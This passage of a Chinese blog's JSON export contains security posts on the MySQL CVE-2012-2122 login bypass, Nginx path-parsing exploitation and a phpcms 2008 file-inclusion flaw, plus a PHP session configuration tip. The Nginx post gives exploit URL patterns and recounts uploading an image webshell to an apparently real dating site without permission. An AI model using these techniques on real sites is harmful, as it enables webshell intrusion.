(GMT+0800)</h3>\n<h2 id=\"漏洞版本:\">漏洞版本:</h2>\n<p>MySQL &lt; 5.6.6<br>MySQL &lt; 5.5.24<br>MySQL &lt; 5.1.63<br>MariaDB &lt; 5.5.23<br>MariaDB &lt; 5.3.6<br>MariaDB &lt; 5.2.12<br>MariaDB &lt; 5.1.62</p>\n<h2 id=\"漏洞描述:\">漏洞描述:</h2>\n<p>CVE ID: CVE-2012-2122</p>\n<p>MariaDB是为MySQL提供偶然替代功能的数据库服务器。MySQL是开源数据库。</p>\n<p>MariaDB 5.1.62, 5.2.12、5.3.6、5.5.23之前版本和MySQL 5.1.63、5.5.24、5.6.6之前版本在用户验证的处理上存在安全漏洞，可能导致攻击者无需知道正确口令就能登录到MySQL服务器。</p>\n<p>用户连接到MariaDB/MySQL后，应用会计算和比较令牌值，由于错误的转换，即使memcmp()返回非零值，也可能出现错误的比较，造成MySQL/MariaDB误认为密码是正确的，因为协议使用的是随机字符串，该Bug发生的几率为1/256。MySQL的版本是否受影响取决于程序的编译方式，很多版本（包括官方提供的二进制文件）并不受此漏洞的影响。</p>\n<p>也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。按照公告说法大约256次就能够蒙对一次。而且漏洞利用工具已经出现。</p>\n<blockquote>\n<p>参考<br><a href=\"http://seclists.org/oss-sec/2012/q2/493\" target=\"_blank\" rel=\"external\">http://seclists.org/oss-sec/2012/q2/493</a></p>\n</blockquote>\n<p>测试方法:</p>\n<p>本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!<br>","_id":"bq5t8krfd8jl8d7u","comments":true,"layout":"post","photos":[],"link":""},{"title":"Nginx解析漏洞原理及其利用方法","id":233,"date":1346180889000,"tags":["4gxvmqbxfd4k4xct"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>Nginx解析漏洞已经是比较老的漏洞了，但是互联网上还有不少使用存在解析漏洞的nginx版本。</p>\n<p>很久没写文章了，睡觉去去法客转了圈看到一片nginx漏洞的渗透文章，才发现自己似乎也没写过。</p>\n<p>nginx解析漏洞是由于nginx部分版本程序本身的漏洞导致解析非可以执行脚本程序如PHP.</p>\n<p>如下面两个假设在存在漏洞的站点上有一张图片url地址为：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">www.creturn.com/logo.jpg   <span class=\"comment\">//假设存在这个图片</span></div></pre></td></tr></table></figure>\n\n<p>而当我们正常访问，nginx会把这个当作非脚本语言直接读取传送会客户端（也就是浏览器），但是</p>\n<p>存在解析漏洞的nginx会把如下连接解析并且执行~：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">www.creturn.<span class=\"keyword\">com</span>/logo.jpg/<span class=\"keyword\">a</span>.php  （老的解析方式）这样写的话nginx会把logo.jpg当作脚本解析执行后再输出</div><div class=\"line\">www.creturn.<span class=\"keyword\">com</span>/logo.jpg%<span class=\"number\">00</span>.php //这个是<span class=\"number\">7</span>月中旬爆出的解析漏洞</div></pre></td></tr></table></figure>\n\n<p>这样的解析漏洞有什么危害？其实很多站的安全或者程序样做的比较严谨的话，就没办法直接拿下，但是很多社交类</p>\n<p>或者交互类的站点上往往允许用户上传图片，如社交网站一般都会允许上传头像~这样如果有心人传送一个图马上去就可以直接解析了。</p>\n<a id=\"more\"></a>\n\n<p>好了，就拿一个实例来说明：</p>\n<p>某交友网站：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/nginx.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/nginx.png\" alt=\"\" title=\"nginx\"></a></p>\n<p>看到这么多图片，嘿嘿~~~肯定有上传的地方。先注册个帐号。刚注册完就提示你上传照片。</p>\n<p>上传一张事先准备好的图马。博客内有制作方法，可查询。</p>\n<p>看到图片，还需要审核~~</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/n.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/n.png\" alt=\"\" title=\"n\"></a></p>\n<p>右击图片审查元素（我用的是chrome浏览器）：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/nginx_t.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/nginx_t.png\" alt=\"\" title=\"nginx_t\"></a></p>\n<p>可以看到图片的连接，不过不要高兴~~ 看到名称middle.jpg了没，如果你是程序员的话，你应该知道</p>\n<p>为了减少服务器压力，图片资源也会被进行处理某些区域显示的只是缩略图，缩略图是经过处理的所以</p>\n<p>图马是不起作用的。所以必须找原图，其实原图的真实地址就是把.middle去掉，为啥？因为原图肯定会</p>\n<p>保存的，由于我的图片在审核（当然我的头像肯定通过不了审核了），如果审核通过可以点击查看大图</p>\n<p>一般这个大图就是你的原图（理论上）。</p>\n<p>好了上菜刀看看连接地址为：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"symbol\">http:</span>/<span class=\"regexp\">/www.creturn.com/upload</span><span class=\"regexp\">/picture/photo</span><span class=\"regexp\">/006/</span><span class=\"number\">65</span>/<span class=\"number\">26</span>/<span class=\"number\">503</span>d136ee3aaf.jpg/.php</div></pre></td></tr></table></figure>\n\n<p>如下图，图片已经成功解析为可执行脚本：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/nginx_t2.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/nginx_t2.png\" alt=\"\" title=\"nginx_t2\"></a></p>\n<p>稍微浏览了下，权限很松~~</p>\n<p>好了，还是希望各大站长能够对安全重视~</p>\n","source":"_posts/nginx解析漏洞原理及其利用方法.md","raw":"title: \"Nginx解析漏洞原理及其利用方法\"\nid: 233\ndate: 2012-08-29 03:08:09\ntags: \n- Nginx解析漏洞\ncategories: \n- 原创作品\n- 技术文章\n---\n\nNginx解析漏洞已经是比较老的漏洞了，但是互联网上还有不少使用存在解析漏洞的nginx版本。\n\n很久没写文章了，睡觉去去法客转了圈看到一片nginx漏洞的渗透文章，才发现自己似乎也没写过。\n\nnginx解析漏洞是由于nginx部分版本程序本身的漏洞导致解析非可以执行脚本程序如PHP.\n\n如下面两个假设在存在漏洞的站点上有一张图片url地址为：\n\n```shell\nwww.creturn.com/logo.jpg   //假设存在这个图片\n```\n\n而当我们正常访问，nginx会把这个当作非脚本语言直接读取传送会客户端（也就是浏览器），但是\n\n存在解析漏洞的nginx会把如下连接解析并且执行~：\n\n```shell\nwww.creturn.com/logo.jpg/a.php  （老的解析方式）这样写的话nginx会把logo.jpg当作脚本解析执行后再输出\nwww.creturn.com/logo.jpg%00.php //这个是7月中旬爆出的解析漏洞\n```\n\n这样的解析漏洞有什么危害？其实很多站的安全或者程序样做的比较严谨的话，就没办法直接拿下，但是很多社交类\n\n或者交互类的站点上往往允许用户上传图片，如社交网站一般都会允许上传头像~这样如果有心人传送一个图马上去就可以直接解析了。\n\n<!--more-->\n\n好了，就拿一个实例来说明：\n\n某交友网站：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/nginx.png \"nginx\")](http://asset.creturn.com/asset/uploads/2012/08/nginx.png)\n\n看到这么多图片，嘿嘿~~~肯定有上传的地方。先注册个帐号。刚注册完就提示你上传照片。\n\n上传一张事先准备好的图马。博客内有制作方法，可查询。\n\n看到图片，还需要审核~~\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/n.png \"n\")](http://asset.creturn.com/asset/uploads/2012/08/n.png)\n\n右击图片审查元素（我用的是chrome浏览器）：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/nginx_t.png \"nginx_t\")](http://asset.creturn.com/asset/uploads/2012/08/nginx_t.png)\n\n可以看到图片的连接，不过不要高兴~~ 看到名称middle.jpg了没，如果你是程序员的话，你应该知道\n\n为了减少服务器压力，图片资源也会被进行处理某些区域显示的只是缩略图，缩略图是经过处理的所以\n\n图马是不起作用的。所以必须找原图，其实原图的真实地址就是把.middle去掉，为啥？因为原图肯定会\n\n保存的，由于我的图片在审核（当然我的头像肯定通过不了审核了），如果审核通过可以点击查看大图\n\n一般这个大图就是你的原图（理论上）。\n\n好了上菜刀看看连接地址为：\n\n```shell\nhttp://www.creturn.com/upload/picture/photo/006/65/26/503d136ee3aaf.jpg/.php\n```\n\n如下图，图片已经成功解析为可执行脚本：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/nginx_t2.png \"nginx_t2\")](http://asset.creturn.com/asset/uploads/2012/08/nginx_t2.png)\n\n稍微浏览了下，权限很松~~\n\n好了，还是希望各大站长能够对安全重视~\n","slug":"nginx解析漏洞原理及其利用方法","updated":1421659126000,"excerpt":"<p>Nginx解析漏洞已经是比较老的漏洞了，但是互联网上还有不少使用存在解析漏洞的nginx版本。</p>\n<p>很久没写文章了，睡觉去去法客转了圈看到一片nginx漏洞的渗透文章，才发现自己似乎也没写过。</p>\n<p>nginx解析漏洞是由于nginx部分版本程序本身的漏洞导致解析非可以执行脚本程序如PHP.</p>\n<p>如下面两个假设在存在漏洞的站点上有一张图片url地址为：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">www.creturn.com/logo.jpg   <span class=\"comment\">//假设存在这个图片</span></div></pre></td></tr></table></figure>\n\n<p>而当我们正常访问，nginx会把这个当作非脚本语言直接读取传送会客户端（也就是浏览器），但是</p>\n<p>存在解析漏洞的nginx会把如下连接解析并且执行~：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">www.creturn.<span class=\"keyword\">com</span>/logo.jpg/<span class=\"keyword\">a</span>.php  （老的解析方式）这样写的话nginx会把logo.jpg当作脚本解析执行后再输出</div><div class=\"line\">www.creturn.<span class=\"keyword\">com</span>/logo.jpg%<span class=\"number\">00</span>.php //这个是<span class=\"number\">7</span>月中旬爆出的解析漏洞</div></pre></td></tr></table></figure>\n\n<p>这样的解析漏洞有什么危害？其实很多站的安全或者程序样做的比较严谨的话，就没办法直接拿下，但是很多社交类</p>\n<p>或者交互类的站点上往往允许用户上传图片，如社交网站一般都会允许上传头像~这样如果有心人传送一个图马上去就可以直接解析了。</p>\n","_id":"w4tp4xrfslx871s6","comments":true,"layout":"post","photos":[],"link":""},{"title":"PHP session 跨子域问题总结","id":187,"date":1343928363000,"tags":[],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>今天遇到这个问题是，自己要在别人现有的东西上面做修改。由于仅仅是子域</p>\n<p>当时就行肯定有简单的解决方法，Google了10多分钟搞定：</p>\n<p>Session主要分两部分：</p>\n<p>一个是Session数据，该数据默认情况下是存放在服务器的tmp文件下的，是以文件形式存在<br>另一个是标志着Session数据的Session Id，Session ID，就是那个 Session 文件的文件名，Session ID 是随机生成的，因此能保证唯一性和随机性，确保 Session 的安全。一般如果没有设置 Session 的生存周期，则 Session ID 存储在内存中，关闭浏览器后该 ID 自动注销，重新请求该页面后，重新注册一个 session ID。如果客户端没有禁用 Cookie，则 Cookie 在启动 Session 会话的时候扮演的是存储 Session ID 和 Session 生存期的角色。<br>两个不同的域名网站，想用同一个Session，就是牵扯到Session跨域问题！<br>默认情况下，各个服务器会各自分别对同一个客户端产生 SESSIONID，如对于同一个用户浏览器，A 服务器产生的 SESSION ID 是 11111111111，而B 服务器生成的则是222222。另外，PHP 的 SESSION数据都是分别保存在本服务器的文件系统中。想要共享 SESSION 数据，那就必须实现两个目标：<br>一个是各个服务器对同一个客户端产生的SESSION ID 必须相同，并且可通过同一个 COOKIE 进行传递，也就是说各个服务器必须可以读取同一个名为 PHPSESSID 的COOKIE；另一个是 SESSION 数据的存储方式/位置必须保证各个服务器都能够访问到。这两个目标简单地说就是多服务器(A、B服务器)共享客户端的 SESSION ID，同时还必须共享服务器端的 SESSION 数据。</p>\n<p>有三种解决方法：</p>\n<p>1.只要在php页面的最开始（要在任何输出之前，并且在session_start()之前）的地方进行以下设置</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">ini_set(<span class=\"string\">'session.cookie_path'</span>, <span class=\"string\">'/'</span>);</div><div class=\"line\">ini_set(<span class=\"string\">'session.cookie_domain'</span>, <span class=\"string\">'.mydomain.com'</span>);</div><div class=\"line\">ini_set(<span class=\"string\">'session.cookie_lifetime'</span>, <span class=\"string\">'1800'</span>);</div></pre></td></tr></table></figure>\n\n<p>2.在php.ini里设置</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">session.cookie_path = /</div><div class=\"line\">session.cookie_domain = .mydomain.com</div><div class=\"line\">session.cookie_lifetime = <span class=\"number\">1800</span></div></pre></td></tr></table></figure>\n\n<p>3.在php页面最开始的地方（条件同1）调用函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">session_set_cookie_params(<span class=\"number\">1800</span> , <span class=\"string\">'/'</span>, <span class=\"string\">'.mydomain.com'</span>);</div></pre></td></tr></table></figure>\n\n<a id=\"more\"></a>\n\n<p>我的解决方法是在入口出添加如下代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">ini_set(<span class=\"string\">'session.cookie_path'</span>, <span class=\"string\">'/'</span>);</div><div class=\"line\">ini_set(<span class=\"string\">'session.cookie_domain'</span>, <span class=\"string\">'.domain.com'</span>); <span class=\"comment\">//注意domain.com换成你自己的域名</span></div><div class=\"line\">ini_set(<span class=\"string\">'session.cookie_lifetime'</span>, <span class=\"string\">'1800'</span>);</div></pre></td></tr></table></figure>\n\n<p>如图：</p>\n<p>站点一</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/session_1.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/session_1.png\" alt=\"\" title=\"session_1\"></a></p>\n<p>站点二</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/session_2.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/session_2.png\" alt=\"\" title=\"session_2\"></a></p>\n<p>&nbsp;</p>\n<p>可以看到两个站点的PHPSESSID是一样的，当然也解决了跨子域名的问题了</p>\n","source":"_posts/php-session-跨子域问题总结.md","raw":"title: \"PHP session 跨子域问题总结\"\nid: 187\ndate: 2012-08-03 01:26:03\ntags: \ncategories: \n- 原创作品\n- 技术文章\n---\n\n今天遇到这个问题是，自己要在别人现有的东西上面做修改。由于仅仅是子域\n\n当时就行肯定有简单的解决方法，Google了10多分钟搞定：\n\nSession主要分两部分：\n\n一个是Session数据，该数据默认情况下是存放在服务器的tmp文件下的，是以文件形式存在\n另一个是标志着Session数据的Session Id，Session ID，就是那个 Session 文件的文件名，Session ID 是随机生成的，因此能保证唯一性和随机性，确保 Session 的安全。一般如果没有设置 Session 的生存周期，则 Session ID 存储在内存中，关闭浏览器后该 ID 自动注销，重新请求该页面后，重新注册一个 session ID。如果客户端没有禁用 Cookie，则 Cookie 在启动 Session 会话的时候扮演的是存储 Session ID 和 Session 生存期的角色。\n两个不同的域名网站，想用同一个Session，就是牵扯到Session跨域问题！\n默认情况下，各个服务器会各自分别对同一个客户端产生 SESSIONID，如对于同一个用户浏览器，A 服务器产生的 SESSION ID 是 11111111111，而B 服务器生成的则是222222。另外，PHP 的 SESSION数据都是分别保存在本服务器的文件系统中。想要共享 SESSION 数据，那就必须实现两个目标：\n一个是各个服务器对同一个客户端产生的SESSION ID 必须相同，并且可通过同一个 COOKIE 进行传递，也就是说各个服务器必须可以读取同一个名为 PHPSESSID 的COOKIE；另一个是 SESSION 数据的存储方式/位置必须保证各个服务器都能够访问到。这两个目标简单地说就是多服务器(A、B服务器)共享客户端的 SESSION ID，同时还必须共享服务器端的 SESSION 数据。\n\n有三种解决方法：\n\n1.只要在php页面的最开始（要在任何输出之前，并且在session_start()之前）的地方进行以下设置\n\n```php\nini_set('session.cookie_path', '/');\nini_set('session.cookie_domain', '.mydomain.com');\nini_set('session.cookie_lifetime', '1800');\n```\n\n2.在php.ini里设置\n\n```php\nsession.cookie_path = /\nsession.cookie_domain = .mydomain.com\nsession.cookie_lifetime = 1800\n```\n\n3.在php页面最开始的地方（条件同1）调用函数\n\n```php\nsession_set_cookie_params(1800 , '/', '.mydomain.com');\n```\n<!--more-->\n\n我的解决方法是在入口出添加如下代码：\n\n```php\nini_set('session.cookie_path', '/');\nini_set('session.cookie_domain', '.domain.com'); //注意domain.com换成你自己的域名\nini_set('session.cookie_lifetime', '1800');\n```\n\n如图：\n\n站点一\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/session_1.png \"session_1\")](http://asset.creturn.com/asset/uploads/2012/08/session_1.png)\n\n站点二\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/session_2.png \"session_2\")](http://asset.creturn.com/asset/uploads/2012/08/session_2.png)\n\n&nbsp;\n\n可以看到两个站点的PHPSESSID是一样的，当然也解决了跨子域名的问题了\n","slug":"php-session-跨子域问题总结","updated":1421659126000,"excerpt":"<p>今天遇到这个问题是，自己要在别人现有的东西上面做修改。由于仅仅是子域</p>\n<p>当时就行肯定有简单的解决方法，Google了10多分钟搞定：</p>\n<p>Session主要分两部分：</p>\n<p>一个是Session数据，该数据默认情况下是存放在服务器的tmp文件下的，是以文件形式存在<br>另一个是标志着Session数据的Session Id，Session ID，就是那个 Session 文件的文件名，Session ID 是随机生成的，因此能保证唯一性和随机性，确保 Session 的安全。一般如果没有设置 Session 的生存周期，则 Session ID 存储在内存中，关闭浏览器后该 ID 自动注销，重新请求该页面后，重新注册一个 session ID。如果客户端没有禁用 Cookie，则 Cookie 在启动 Session 会话的时候扮演的是存储 Session ID 和 Session 生存期的角色。<br>两个不同的域名网站，想用同一个Session，就是牵扯到Session跨域问题！<br>默认情况下，各个服务器会各自分别对同一个客户端产生 SESSIONID，如对于同一个用户浏览器，A 服务器产生的 SESSION ID 是 11111111111，而B 服务器生成的则是222222。另外，PHP 的 SESSION数据都是分别保存在本服务器的文件系统中。想要共享 SESSION 数据，那就必须实现两个目标：<br>一个是各个服务器对同一个客户端产生的SESSION ID 必须相同，并且可通过同一个 COOKIE 进行传递，也就是说各个服务器必须可以读取同一个名为 PHPSESSID 的COOKIE；另一个是 SESSION 数据的存储方式/位置必须保证各个服务器都能够访问到。这两个目标简单地说就是多服务器(A、B服务器)共享客户端的 SESSION ID，同时还必须共享服务器端的 SESSION 数据。</p>\n<p>有三种解决方法：</p>\n<p>1.只要在php页面的最开始（要在任何输出之前，并且在session_start()之前）的地方进行以下设置</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">ini_set(<span class=\"string\">'session.cookie_path'</span>, <span class=\"string\">'/'</span>);</div><div class=\"line\">ini_set(<span class=\"string\">'session.cookie_domain'</span>, <span class=\"string\">'.mydomain.com'</span>);</div><div class=\"line\">ini_set(<span class=\"string\">'session.cookie_lifetime'</span>, <span class=\"string\">'1800'</span>);</div></pre></td></tr></table></figure>\n\n<p>2.在php.ini里设置</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">session.cookie_path = /</div><div class=\"line\">session.cookie_domain = .mydomain.com</div><div class=\"line\">session.cookie_lifetime = <span class=\"number\">1800</span></div></pre></td></tr></table></figure>\n\n<p>3.在php页面最开始的地方（条件同1）调用函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">session_set_cookie_params(<span class=\"number\">1800</span> , <span class=\"string\">'/'</span>, <span class=\"string\">'.mydomain.com'</span>);</div></pre></td></tr></table></figure>\n\n","_id":"0rsn2md0zyzwbvnp","comments":true,"layout":"post","photos":[],"link":""},{"title":"phpcms 2008多个漏洞 (可getshell)","id":148,"date":1342713537000,"tags":["gifemktnf94ke7hd"],"categories":["1bynalp69sca7b8g","n6ap4t4mi3gt91g0"],"content":"<p>本文转自乌云：<a href=\"http://www.wooyun.org/bugs/wooyun-2010-09563\" target=\"_blank\" rel=\"external\">http://www.wooyun.org/bugs/wooyun-2010-09563</a><br>[php]</p>\n<h3 id=\"文件包含\">文件包含</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\">define(<span class=\"string\">'IN_YP'</span>, <span class=\"keyword\">TRUE</span>);</div><div class=\"line\">define(<span class=\"string\">'ADMIN_ROOT'</span>, str_replace(&quot;&quot;, <span class=\"string\">'/'</span>,dirname(<span class=\"keyword\">__FILE__</span>)).<span class=\"string\">'/'</span>);</div><div class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">'../include/common.inc.php'</span>;</div></pre></td></tr></table></figure>\n\n<h2 id=\"要登陆\">要登陆</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"variable\">$_userid</span>) showmessage(<span class=\"string\">'您还没有登陆，即将跳转到登陆页面'</span>,</div><div class=\"line\"><span class=\"variable\">$MODULE</span>[<span class=\"string\">'member'</span>][<span class=\"string\">'url'</span>].<span class=\"string\">'login.php?forward='</span>.urlencode(URL));</div><div class=\"line\">session_start();</div></pre></td></tr></table></figure>\n\n<h2 id=\"$file变量可控制\">$file变量可控制</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$file</span>) || <span class=\"keyword\">empty</span>(<span class=\"variable\">$file</span>)) <span class=\"variable\">$file</span> = <span class=\"string\">'panel'</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* $company_user_infos 获取企业会员信息 */</span></div><div class=\"line\"><span class=\"variable\">$company_user_infos</span> = <span class=\"variable\">$db</span>-&gt;get_one(&quot;SELECT * FROM `&quot;.DB_PRE.&quot;member_company` </div><div class=\"line\">WHERE `userid`=<span class=\"string\">'$_userid'</span>&quot;);</div><div class=\"line\"><span class=\"variable\">$userid</span> = <span class=\"variable\">$_userid</span>;</div></pre></td></tr></table></figure>\n\n<a id=\"more\"></a>\n\n<h2 id=\"注册的时候选择企业用户\">注册的时候选择企业用户</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"variable\">$company_user_infos</span>)</div><div class=\"line\">{</div><div class=\"line\"> <span class=\"variable\">$MS</span>[<span class=\"string\">'title'</span>] = <span class=\"string\">'您不是企业会员'</span>;</div><div class=\"line\"> <span class=\"variable\">$MS</span>[<span class=\"string\">'description'</span>] = <span class=\"string\">'你可以做下面操作'</span>;</div><div class=\"line\"> <span class=\"variable\">$MS</span>[<span class=\"string\">'urls'</span>][<span class=\"number\">0</span>] = <span class=\"keyword\">array</span>(</div><div class=\"line\"> <span class=\"string\">'name'</span>=&gt;<span class=\"string\">'免费升级为企业会员'</span>,</div><div class=\"line\"> <span class=\"string\">'url'</span>=&gt;<span class=\"variable\">$PHPCMS</span>[<span class=\"string\">'siteurl'</span>].<span class=\"variable\">$M</span>[<span class=\"string\">'url'</span>].<span class=\"string\">'company.php?action=member'</span>,</div><div class=\"line\"> );</div><div class=\"line\"> <span class=\"variable\">$MS</span>[<span class=\"string\">'urls'</span>][<span class=\"number\">1</span>] = <span class=\"keyword\">array</span>(</div><div class=\"line\"> <span class=\"string\">'name'</span>=&gt;<span class=\"string\">'退出当前帐号，换其他帐号登陆'</span>,</div><div class=\"line\"> <span class=\"string\">'url'</span>=&gt;<span class=\"variable\">$PHPCMS</span>[<span class=\"string\">'siteurl'</span>].<span class=\"string\">'member/logout.php'</span>,</div><div class=\"line\"> );</div><div class=\"line\"> <span class=\"variable\">$MS</span>[<span class=\"string\">'urls'</span>][<span class=\"number\">2</span>] = <span class=\"keyword\">array</span>(</div><div class=\"line\"> <span class=\"string\">'name'</span>=&gt;<span class=\"string\">'重新注册为企业会员'</span>,</div><div class=\"line\"> <span class=\"string\">'url'</span>=&gt;<span class=\"variable\">$PHPCMS</span>[<span class=\"string\">'siteurl'</span>].<span class=\"string\">'member/logout.php?forward='</span>.</div><div class=\"line\">urlencode(<span class=\"variable\">$PHPCMS</span>[<span class=\"string\">'siteurl'</span>].<span class=\"string\">'member/register.php'</span>),</div><div class=\"line\"> );</div><div class=\"line\"> msg(<span class=\"variable\">$MS</span>);</div><div class=\"line\">}</div><div class=\"line\"><span class=\"variable\">$CATEGORY</span> = subcat(<span class=\"string\">'yp'</span>);</div><div class=\"line\"><span class=\"variable\">$siteurl</span> = company_url(<span class=\"variable\">$userid</span>, <span class=\"variable\">$company_user_infos</span>[<span class=\"string\">'sitedomain'</span>]);</div><div class=\"line\"></div><div class=\"line\"><span class=\"variable\">$_SESSION</span>[<span class=\"string\">'url'</span>] = QUERY_STRING;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$file</span> != <span class=\"string\">'company'</span> &amp;&amp; <span class=\"variable\">$M</span>[<span class=\"string\">'enableSecondDomain'</span>] &amp;&amp;</div><div class=\"line\"> !<span class=\"variable\">$company_user_infos</span>[<span class=\"string\">'sitedomain'</span>]) </div><div class=\"line\">showmessage(<span class=\"string\">'请先绑定您的二级域名'</span>,BUSINESSDIR.<span class=\"string\">'?file=company'</span>);</div><div class=\"line\"></div><div class=\"line\">check_priv(<span class=\"variable\">$file</span>);</div><div class=\"line\"><span class=\"variable\">$GROUP</span> = cache_read(<span class=\"string\">'member_group.php'</span>);</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">## 此处直接包含了，注意$file是可以控制的但须要截断</span></div><div class=\"line\"><span class=\"keyword\">if</span>(!@<span class=\"keyword\">include</span> ADMIN_ROOT.<span class=\"variable\">$file</span>.<span class=\"string\">'.inc.php'</span>) </div><div class=\"line\">showmessage(<span class=\"string\">'The file ./yp/'</span>.<span class=\"variable\">$file</span>.<span class=\"string\">'.inc.php is not exists!'</span>);</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_priv</span><span class=\"params\">(<span class=\"variable\">$file</span>)</span></span></div><div class=\"line\">{</div><div class=\"line\"> <span class=\"keyword\">global</span> <span class=\"variable\">$M</span>,<span class=\"variable\">$PHPCMS</span>,<span class=\"variable\">$_groupid</span>;</div><div class=\"line\"> <span class=\"keyword\">if</span>(!<span class=\"variable\">$M</span>[&quot;allow_add_<span class=\"variable\">$file</span>&quot;]) <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</div><div class=\"line\"> <span class=\"keyword\">if</span>(!in_array(<span class=\"variable\">$_groupid</span>,<span class=\"variable\">$M</span>[&quot;allow_add_<span class=\"variable\">$file</span>&quot;]))</div><div class=\"line\"> {</div><div class=\"line\"> <span class=\"variable\">$MS</span>[<span class=\"string\">'title'</span>] = <span 